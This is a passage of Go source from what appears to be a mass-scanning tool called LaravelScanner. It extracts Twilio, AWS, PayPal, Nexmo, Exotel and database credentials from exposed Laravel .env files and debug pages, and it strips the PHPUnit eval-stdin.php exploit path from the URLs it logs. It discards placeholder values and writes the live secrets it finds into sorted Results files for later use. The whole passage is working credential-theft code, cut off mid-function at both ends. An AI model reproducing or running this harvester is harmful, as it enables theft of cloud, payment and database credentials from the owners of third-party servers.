			accSid = matches[1]
		}
		if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
			accKey = matches[1]
		}
		if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
			sec = matches[1]
		}
		if matches := chatRegex.FindStringSubmatch(content); len(matches) > 1 {
			chatid = matches[1]
		}
		if matches := phoneRegex.FindStringSubmatch(content); len(matches) > 1 {
			phone = matches[1]
		}
		if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
			authToken = matches[1]
		}
	} else if method == "debug" {
		sidRegex := regexp.MustCompile(`<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		keyRegex := regexp.MustCompile(`<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		secRegex := regexp.MustCompile(`<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		chatRegex := regexp.MustCompile(`<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		phoneRegex := regexp.MustCompile(`<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		tokenRegex := regexp.MustCompile(`<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>`)

		if matches := sidRegex.FindStringSubmatch(content); len(matches) > 1 {
			accSid = matches[1]
		}
		if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
			accKey = matches[1]
		}
		if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
			sec = matches[1]
		}
		if matches := chatRegex.FindStringSubmatch(content); len(matches) > 1 {
			chatid = matches[1]
		}
		if matches := phoneRegex.FindStringSubmatch(content); len(matches) > 1 {
			phone = matches[1]
		}
		if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
			authToken = matches[1]
		}
	}

	l.mutex.Lock()
	l.twillio++
	l.mutex.Unlock()

	// Build the credential string
	twilioInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nTWILIO_ACCOUNT_SID: %s\nTWILIO_API_KEY: %s\nTWILIO_API_SECRET: %s\nTWILIO_CHAT_SERVICE_SID: %s\nTWILIO_NUMBER: %s\nTWILIO_AUTH_TOKEN: %s\n\n",
		url, method, accSid, accKey, sec, chatid, phone, authToken)

	// Save to TWILLIO.txt
	f, err := os.OpenFile("Results/TWILLIO.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(twilioInfo)
	}
}

func (l *LaravelScanner) getAWS(content string, method string, url string) {

	// Check for AWS credentials
	awsFound := false

	// Function to get AWS region from content
	getAwsRegion := func(text string) string {
		for _, region := range AWS_REGIONS {
			if strings.Contains(text, region) {
				return region
			}
		}
		return "aws_unknown_region"
	}

	// Check for AWS_ACCESS_KEY_ID pattern
	if strings.Contains(content, "AWS_ACCESS_KEY_ID") {
		var awsKey, awsSec, awsReg, awsBucket string

		if method == "/.env" {
			keyRegex := regexp.MustCompile(`AWS_ACCESS_KEY_ID=(.*?)\n`)
			secRegex := regexp.MustCompile(`AWS_SECRET_ACCESS_KEY=(.*?)\n`)

			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsKey = matches[1]
			}
			if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsSec = matches[1]
			}
			awsReg = getAwsRegion(content)
		} else if method == "debug" {
			keyRegex := regexp.MustCompile(`<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			secRegex := regexp.MustCompile(`<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)

			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsKey = matches[1]
			}
			if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsSec = matches[1]
			}
			awsReg = getAwsRegion(content)
		}

		if awsKey != "" && awsSec != "" {
			awsFound = true
			l.mutex.Lock()
			l.aws++
			l.mutex.Unlock()

			l.logger.Success("AWS credentials found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			awsInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nAWS ACCESS KEY: %s\nAWS SECRET KEY: %s\nAWS REGION: %s\nAWS BUCKET: %s\n\n",
				baseURL, method, awsKey, awsSec, awsReg, awsBucket)

			// Save to region-specific file
			f, err := os.OpenFile("Results/"+awsReg+".txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(awsInfo)
			}

			// Also save to aws_access_key_secret.txt
			f2, err := os.OpenFile("Results/aws_access_key_secret.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f2.Close()
				f2.WriteString(awsInfo)
			}
		}
	}

	// Check for AWS_KEY pattern
	if !awsFound && strings.Contains(content, "AWS_KEY") {
		var awsKey, awsSec, awsReg, awsBucket string

		if method == "/.env" {
			keyRegex := regexp.MustCompile(`AWS_KEY=(.*?)\n`)
			secRegex := regexp.MustCompile(`AWS_SECRET=(.*?)\n`)
			bucketRegex := regexp.MustCompile(`AWS_BUCKET=(.*?)\n`)

			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsKey = matches[1]
			}
			if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsSec = matches[1]
			}
			if matches := bucketRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsBucket = matches[1]
			}
			awsReg = getAwsRegion(content)
		} else if method == "debug" {
			keyRegex := regexp.MustCompile(`<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			secRegex := regexp.MustCompile(`<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			bucketRegex := regexp.MustCompile(`<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>`)

			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsKey = matches[1]
			}
			if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsSec = matches[1]
			}
			if matches := bucketRegex.FindStringSubmatch(content); len(matches) > 1 {
				awsBucket = matches[1]
			}
			awsReg = getAwsRegion(content)
		}

		if awsKey != "" && awsSec != "" {
			awsFound = true
			l.mutex.Lock()
			l.aws++
			l.mutex.Unlock()

			l.logger.Success("AWS credentials found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			awsInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nAWS ACCESS KEY: %s\nAWS SECRET KEY: %s\nAWS REGION: %s\nAWS BUCKET: %s\n\n",
				baseURL, method, awsKey, awsSec, awsReg, awsBucket)

			// Save to region-specific file
			f, err := os.OpenFile("Results/"+awsReg+".txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(awsInfo)
			}

			// Also save to aws_access_key_secret.txt
			f2, err := os.OpenFile("Results/aws_access_key_secret.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f2.Close()
				f2.WriteString(awsInfo)
			}
		}
	}

	// Check for other AWS patterns (S3, SNS, SES)
	awsPatterns := []struct {
		keyName          string
		secretName       string
		keyRegex         string
		secretRegex      string
		debugKeyRegex    string
		debugSecretRegex string
		filePrefix       string
	}{
		{
			keyName:          "AWS_SNS_KEY",
			secretName:       "AWS_SNS_SECRET",
			keyRegex:         `AWS_SNS_KEY=(.*?)\n`,
			secretRegex:      `AWS_SNS_SECRET=(.*?)\n`,
			debugKeyRegex:    `<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugSecretRegex: `<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			filePrefix:       "aws_sns_key_secret",
		},
		{
			keyName:          "AWS_S3_KEY",
			secretName:       "AWS_S3_SECRET",
			keyRegex:         `AWS_S3_KEY=(.*?)\n`,
			secretRegex:      `AWS_S3_SECRET=(.*?)\n`,
			debugKeyRegex:    `<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugSecretRegex: `<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			filePrefix:       "aws_access_key_secret",
		},
		{
			keyName:          "AWS_SES_KEY",
			secretName:       "AWS_SES_SECRET",
			keyRegex:         `AWS_SES_KEY=(.*?)\n`,
			secretRegex:      `AWS_SES_SECRET=(.*?)\n`,
			debugKeyRegex:    `<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugSecretRegex: `<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			filePrefix:       "aws_access_key_secret",
		},
		{
			keyName:          "SES_KEY",
			secretName:       "SES_SECRET",
			keyRegex:         `SES_KEY=(.*?)\n`,
			secretRegex:      `SES_SECRET=(.*?)\n`,
			debugKeyRegex:    `<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugSecretRegex: `<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			filePrefix:       "aws_access_key_secret",
		},
	}

	for _, pattern := range awsPatterns {
		if !awsFound && strings.Contains(content, pattern.keyName) {
			var awsKey, awsSec, awsReg string

			if method == "/.env" {
				keyRegex := regexp.MustCompile(pattern.keyRegex)
				secRegex := regexp.MustCompile(pattern.secretRegex)

				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					awsKey = matches[1]
				}
				if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
					awsSec = matches[1]
				}
				awsReg = getAwsRegion(content)
			} else if method == "debug" {
				keyRegex := regexp.MustCompile(pattern.debugKeyRegex)
				secRegex := regexp.MustCompile(pattern.debugSecretRegex)

				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					awsKey = matches[1]
				}
				if matches := secRegex.FindStringSubmatch(content); len(matches) > 1 {
					awsSec = matches[1]
				}
				awsReg = getAwsRegion(content)
			}

			if awsKey != "" && awsSec != "" {
				awsFound = true
				l.mutex.Lock()
				l.aws++
				l.mutex.Unlock()

				l.logger.Success("AWS credentials found: " + url)

				// Build the credential string
				baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
				awsInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nAWS ACCESS KEY: %s\nAWS SECRET KEY: %s\nAWS REGION: %s\nAWS BUCKET: \n\n",
					baseURL, method, awsKey, awsSec, awsReg)

				// Save to region-specific file
				f, err := os.OpenFile("Results/"+awsReg+".txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err == nil {
					defer f.Close()
					f.WriteString(awsInfo)
				}

				// Also save to pattern-specific file
				f2, err := os.OpenFile("Results/"+pattern.filePrefix+".txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err == nil {
					defer f2.Close()
					f2.WriteString(awsInfo)
				}
			}
		}
	}
}

func (l *LaravelScanner) getPayPal(content string, method string, url string) {

	if strings.Contains(content, "PAYPAL_") {
		l.mutex.Lock()
		l.paypal++
		l.mutex.Unlock()

		l.logger.Success("PayPal credentials found: " + url)

		// Save to paypal_sandbox.txt
		baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
		f, err := os.OpenFile("Results/paypal_sandbox.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			f.WriteString(baseURL + "\n")
		}
	}
}

func (l *LaravelScanner) getNexmo(content string, method string, url string) {

	// Check for Nexmo credentials
	if strings.Contains(content, "NEXMO") {
		var nexmoKey, nexmoSecret, nexmoNumber string

		if method == "/.env" {
			keyRegex := regexp.MustCompile(`NEXMO_KEY=(.*?)\n`)
			secretRegex := regexp.MustCompile(`NEXMO_SECRET=(.*?)\n`)
			numberRegex := regexp.MustCompile(`NEXMO_NUMBER=(.*?)\n`)

			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				nexmoKey = matches[1]
			}
			if matches := secretRegex.FindStringSubmatch(content); len(matches) > 1 {
				nexmoSecret = matches[1]
			}
			if matches := numberRegex.FindStringSubmatch(content); len(matches) > 1 {
				nexmoNumber = matches[1]
			}
		} else if method == "debug" {
			keyRegex := regexp.MustCompile(`<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			secretRegex := regexp.MustCompile(`<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			numberRegex := regexp.MustCompile(`<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>`)

			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				nexmoKey = matches[1]
			}
			if matches := secretRegex.FindStringSubmatch(content); len(matches) > 1 {
				nexmoSecret = matches[1]
			}
			if matches := numberRegex.FindStringSubmatch(content); len(matches) > 1 {
				nexmoNumber = matches[1]
			}
		}

		l.mutex.Lock()
		l.nexmo++
		l.mutex.Unlock()

		l.logger.Success("Nexmo credentials found: " + url)

		// Build the credential string
		baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
		nexmoInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nNEXMO_KEY: %s\nNEXMO_SECRET: %s\nNEXMO_NUMBER: %s\n\n",
			baseURL, method, nexmoKey, nexmoSecret, nexmoNumber)

		// Save to NEXMO.txt
		f, err := os.OpenFile("Results/NEXMO.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			f.WriteString(nexmoInfo)
		}
	}
}

func (l *LaravelScanner) getDatabase(content string, method string, url string) {
	// Skip if content doesn't look like an environment file or debug output
	if !isValidEnvContent(content, method) {
		return
	}

	// Database configuration patterns
	dbPatterns := []struct {
		connKey      string
		hostKey      string
		dbKey        string
		userKey      string
		passKey      string
		portKey      string
		debugConnKey string
		debugHostKey string
		debugDbKey   string
		debugUserKey string
		debugPassKey string
		debugPortKey string
	}{
		// Standard Laravel DB config
		{
			connKey:      `DB_CONNECTION=(.*?)\n`,
			hostKey:      `DB_HOST=(.*?)\n`,
			dbKey:        `DB_DATABASE=(.*?)\n`,
			userKey:      `DB_USERNAME=(.*?)\n`,
			passKey:      `DB_PASSWORD=(.*?)\n`,
			portKey:      `DB_PORT=(.*?)\n`,
			debugConnKey: `<td>DB_CONNECTION<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugHostKey: `<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugDbKey:   `<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		// Alternative DATABASE config
		{
			connKey:      `DATABASE_CONNECTION=(.*?)\n`,
			hostKey:      `DATABASE_HOST=(.*?)\n`,
			dbKey:        `DATABASE_NAME=(.*?)\n`,
			userKey:      `DATABASE_USERNAME=(.*?)\n`,
			passKey:      `DATABASE_PASSWORD=(.*?)\n`,
			portKey:      `DATABASE_PORT=(.*?)\n`,
			debugConnKey: `<td>DATABASE_CONNECTION<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugHostKey: `<td>DATABASE_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugDbKey:   `<td>DATABASE_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>DATABASE_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>DATABASE_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>DATABASE_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		// MySQL specific config
		{
			connKey:      `MYSQL_CONNECTION=(.*?)\n`,
			hostKey:      `MYSQL_HOST=(.*?)\n`,
			dbKey:        `MYSQL_DATABASE=(.*?)\n`,
			userKey:      `MYSQL_USERNAME=(.*?)\n`,
			passKey:      `MYSQL_PASSWORD=(.*?)\n`,
			portKey:      `MYSQL_PORT=(.*?)\n`,
			debugConnKey: `<td>MYSQL_CONNECTION<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugHostKey: `<td>MYSQL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugDbKey:   `<td>MYSQL_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>MYSQL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>MYSQL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>MYSQL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		// Alternative MYSQL config
		{
			connKey:      ``,
			hostKey:      `MYSQL_HOST=(.*?)\n`,
			dbKey:        `MYSQL_DB=(.*?)\n`,
			userKey:      `MYSQL_USER=(.*?)\n`,
			passKey:      `MYSQL_PASS=(.*?)\n`,
			portKey:      `MYSQL_PORT=(.*?)\n`,
			debugConnKey: ``,
			debugHostKey: `<td>MYSQL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugDbKey:   `<td>MYSQL_DB<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>MYSQL_USER<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>MYSQL_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>MYSQL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		// PostgreSQL specific config
		{
			connKey:      ``,
			hostKey:      `POSTGRES_HOST=(.*?)\n`,
			dbKey:        `POSTGRES_DB=(.*?)\n`,
			userKey:      `POSTGRES_USER=(.*?)\n`,
			passKey:      `POSTGRES_PASSWORD=(.*?)\n`,
			portKey:      `POSTGRES_PORT=(.*?)\n`,
			debugConnKey: ``,
			debugHostKey: `<td>POSTGRES_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugDbKey:   `<td>POSTGRES_DB<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>POSTGRES_USER<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>POSTGRES_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>POSTGRES_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
	}

	for _, pattern := range dbPatterns {
		var dbConn, dbHost, dbDatabase, dbUser, dbPass, dbPort string

		if method == "/.env" {
			if pattern.connKey != "" {
				connRegex := regexp.MustCompile(pattern.connKey)
				if matches := connRegex.FindStringSubmatch(content); len(matches) > 1 {
					dbConn = matches[1]
				}
			}

			hostRegex := regexp.MustCompile(pattern.hostKey)
			dbRegex := regexp.MustCompile(pattern.dbKey)
			userRegex := regexp.MustCompile(pattern.userKey)
			passRegex := regexp.MustCompile(pattern.passKey)

			if pattern.portKey != "" {
				portRegex := regexp.MustCompile(pattern.portKey)
				if matches := portRegex.FindStringSubmatch(content); len(matches) > 1 {
					dbPort = matches[1]
				}
			}

			if matches := hostRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbHost = matches[1]
			}
			if matches := dbRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbDatabase = matches[1]
			}
			if matches := userRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbUser = matches[1]
			}
			if matches := passRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbPass = matches[1]
			}
		} else if method == "debug" {
			if pattern.debugConnKey != "" {
				connRegex := regexp.MustCompile(pattern.debugConnKey)
				if matches := connRegex.FindStringSubmatch(content); len(matches) > 1 {
					dbConn = matches[1]
				}
			}

			hostRegex := regexp.MustCompile(pattern.debugHostKey)
			dbRegex := regexp.MustCompile(pattern.debugDbKey)
			userRegex := regexp.MustCompile(pattern.debugUserKey)
			passRegex := regexp.MustCompile(pattern.debugPassKey)

			if pattern.debugPortKey != "" {
				portRegex := regexp.MustCompile(pattern.debugPortKey)
				if matches := portRegex.FindStringSubmatch(content); len(matches) > 1 {
					dbPort = matches[1]
				}
			}

			if matches := hostRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbHost = matches[1]
			}
			if matches := dbRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbDatabase = matches[1]
			}
			if matches := userRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbUser = matches[1]
			}
			if matches := passRegex.FindStringSubmatch(content); len(matches) > 1 {
				dbPass = matches[1]
			}
		}

		// Check if we have enough information to consider this a valid database config
		// At minimum, we need a host and either username or password
		if dbHost != "" && (dbUser != "" || dbPass != "") {
			// Skip if credentials are null, empty, or placeholder values
			if isPlaceholderValue(dbUser) && isPlaceholderValue(dbPass) {
				continue
			}

			l.mutex.Lock()
			l.database++
			l.mutex.Unlock()

			l.logger.Success("Database credentials found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			dbInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nDB_CONNECTION: %s\nDB_HOST: %s\nDB_PORT: %s\nDB_DATABASE: %s\nDB_USERNAME: %s\nDB_PASSWORD: %s\n\n",
				baseURL, method, dbConn, dbHost, dbPort, dbDatabase, dbUser, dbPass)

			// Save to database.txt
			f, err := os.OpenFile("Results/database.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(dbInfo)
			}

			// We found valid database credentials, no need to check other patterns
			return
		}
	}
}

// Helper function to check if a value is a placeholder or empty
func isPlaceholderValue(value string) bool {
	value = strings.ToLower(strings.TrimSpace(value))
	return value == "" ||
		value == "null" ||
		value == "root" ||
		value == "admin" ||
		value == "password" ||
		value == "secret" ||
		value == "example" ||
		value == "changeme" ||
		value == "homestead" ||
		value == "forge"
}

// Helper function to validate if content looks like an environment file or debug output
func isValidEnvContent(content string, method string) bool {
	// Quick check for empty or very short content
	if len(content) < 20 {
		return false
	}

	// Check for common non-env content types
	if isHTMLWithoutEnvVars(content) || isJSONWithoutEnvVars(content) || isPlainErrorMessage(content) {
		return false
	}

	if method == "/.env" {
		// Check for KEY=VALUE pattern that's common in .env files
		keyValuePattern := regexp.MustCompile(`(?m)^[A-Z][A-Z0-9_]*=.*$`)
		lines := strings.Split(content, "\n")

		envVarCount := 0
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") {
				continue // Skip empty lines and comments
			}

			if keyValuePattern.MatchString(line) {
				envVarCount++
			}
		}

		// If we have at least a few environment variables, consider it valid
		return envVarCount >= 3
	} else if method == "debug" {
		// Check for Laravel debug table pattern with environment variables

		// First, check if it looks like a Laravel debug page with env vars
		if !strings.Contains(content, "<td>") ||
			!strings.Contains(content, "</td>") {
			return false
		}

		// Count environment variable patterns in debug output
		envVarPatterns := []string{
			"<td>APP_", "<td>DB_", "<td>MAIL_",
			"<td>REDIS_", "<td>QUEUE_", "<td>CACHE_",
			"<td>AWS_", "<td>STRIPE_", "<td>PAYPAL_",
			"<td>YOUTUBE_API", "<td>YOUTUBE_API_URL", "<td>YOUTUBE_MAX_RESULTS",
			"<td>MIX_PUSHER_APP_ID", "<td>MIX_PUSHER_APP_CLUSTER",
			"<td>EXOTEL_API_KEY", "<td>EXOTEL_API_TOKEN", "<td>EXOTEL_API_SID",
			"<td>ONESIGNAL_APP_ID", "<td>ONESIGNAL_REST_API_KEY", "<td>ONESIGNAL_USER_AUTH_KEY",
		}

		envVarCount := 0
		for _, pattern := range envVarPatterns {
			if strings.Contains(content, pattern) {
				envVarCount++
			}
		}

		// Check if it's a Whoops error page (which we want to exclude unless it has many env vars)
		if strings.Contains(content, "Whoops! There was an error") ||
			strings.Contains(content, "class=\"sf-dump-") ||
			strings.Contains(content, "Stack trace:") {
			// Only consider valid if it has a significant number of env vars
			return envVarCount >= 5
		}

		// Regular debug page with some env vars
		return envVarCount >= 3
	}

	return false
}

// Helper function to check if content is HTML without environment variables
func isHTMLWithoutEnvVars(content string) bool {
	// Check if it's HTML
	isHTML := strings.Contains(content, "<html") ||
		strings.Contains(content, "<!DOCTYPE html") ||
		(strings.Contains(content, "<body") && strings.Contains(content, "</body>"))

	// If it's HTML, check if it lacks environment variables
	if isHTML {
		// Common environment variable prefixes
		envPrefixes := []string{"APP_", "DB_", "MAIL_", "REDIS_", "QUEUE_", "CACHE_"}

		for _, prefix := range envPrefixes {
			if strings.Contains(content, prefix) {
				return false // Has env vars, so not "HTML without env vars"
			}
		}

		return true // HTML without env vars
	}

	return false
}

// Helper function to check if content is JSON without environment variables
func isJSONWithoutEnvVars(content string) bool {
	// Simple check for JSON format
	trimmed := strings.TrimSpace(content)
	isJSON := (strings.HasPrefix(trimmed, "{") && strings.HasSuffix(trimmed, "}")) ||
		(strings.HasPrefix(trimmed, "[") && strings.HasSuffix(trimmed, "]"))

	if isJSON {
		// Common environment variable prefixes
		envPrefixes := []string{"APP_", "DB_", "MAIL_", "REDIS_", "QUEUE_", "CACHE_"}

		for _, prefix := range envPrefixes {
			if strings.Contains(content, prefix) {
				return false // Has env vars, so not "JSON without env vars"
			}
		}

		return true // JSON without env vars
	}

	return false
}

// Helper function to check if content is a plain error message
func isPlainErrorMessage(content string) bool {
	// Check for common error messages
	errorPatterns := []string{
		"Access denied", "Permission denied",
		"Not Found", "404", "403", "500",
		"Internal Server Error",
		"The requested URL was not found",
		"No input file specified",
		"Fatal error", "Parse error", "Warning:",
		"You don't have permission",
		"Directory listing denied",
		"Stack trace:", "Exception:", "Error:",
	}

	// If content is short and contains error patterns, it's likely an error message
	if len(content) < 500 {
		for _, pattern := range errorPatterns {
			if strings.Contains(content, pattern) {
				return true
			}
		}
	}

	return false
}

// Helper function to check if content has any credentials
func hasCredentials(content string, method string) bool {
	// For .env files, check for credential-related keywords
	if method == "/.env" {
		credentialKeywords := []string{
			"PASSWORD", "SECRET", "KEY", "TOKEN", "AUTH", "CREDENTIAL",
			"API_KEY", "APIKEY", "ACCESS_KEY", "ACCESSKEY",
		}

		// Case-insensitive search for credential keywords
		lowerContent := strings.ToLower(content)
		for _, keyword := range credentialKeywords {
			if strings.Contains(lowerContent, strings.ToLower(keyword)) {
				// Verify it's in a KEY=VALUE format, not just mentioned in text
				pattern := regexp.MustCompile(`(?i)[A-Z0-9_]*` + keyword + `[A-Z0-9_]*\s*=`)
				if pattern.MatchString(content) {
					return true
				}
			}
		}
	} else if method == "debug" {
		// For debug output, check for credential-related table rows
		credentialKeywords := []string{
			"PASSWORD", "SECRET", "KEY", "TOKEN", "AUTH", "CREDENTIAL",
			"API_KEY", "APIKEY", "ACCESS_KEY", "ACCESSKEY",
		}

		// Count how many credential patterns we find
		credCount := 0
		for _, keyword := range credentialKeywords {
			lowerKeyword := strings.ToLower(keyword)
			lowerContent := strings.ToLower(content)

			// Check for various patterns in table cells
			patterns := []string{
				"<td>" + lowerKeyword,
				"<td>db_" + lowerKeyword,
				"<td>mail_" + lowerKeyword,
				"<td>aws_" + lowerKeyword,
				"<td>stripe_" + lowerKeyword,
				"<td>paypal_" + lowerKeyword,
			}

			for _, pattern := range patterns {
				if strings.Contains(lowerContent, pattern) {
					credCount++
				}
			}
		}

		// Only consider it has credentials if multiple patterns are found
		return credCount >= 2
	}

	return false
}

func (l *LaravelScanner) getOtherAPIs(content string, method string, url string) {
	// Skip if content doesn't look like an environment file or debug output
	if !isValidEnvContent(content, method) {
		return
	}

	// Check for Exotel credentials
	if strings.Contains(content, "EXOTEL_API_KEY") {
		var exotelApi, exotelToken, exotelSid string

		if method == "/.env" {
			apiRegex := regexp.MustCompile(`EXOTEL_API_KEY=(.*?)\n`)
			tokenRegex := regexp.MustCompile(`EXOTEL_API_TOKEN=(.*?)\n`)
			sidRegex := regexp.MustCompile(`EXOTEL_API_SID=(.*?)\n`)

			if matches := apiRegex.FindStringSubmatch(content); len(matches) > 1 {
				exotelApi = matches[1]
			}
			if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
				exotelToken = matches[1]
			}
			if matches := sidRegex.FindStringSubmatch(content); len(matches) > 1 {
				exotelSid = matches[1]
			}
		} else if method == "debug" {
			apiRegex := regexp.MustCompile(`<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			tokenRegex := regexp.MustCompile(`<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			sidRegex := regexp.MustCompile(`<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>`)

			if matches := apiRegex.FindStringSubmatch(content); len(matches) > 1 {
				exotelApi = matches[1]
			}
			if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
				exotelToken = matches[1]
			}
			if matches := sidRegex.FindStringSubmatch(content); len(matches) > 1 {
				exotelSid = matches[1]
			}
		}

		l.mutex.Lock()
		l.exotel++
		l.mutex.Unlock()

		l.logger.Success("Exotel credentials found: " + url)

		// Build the credential string
		baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
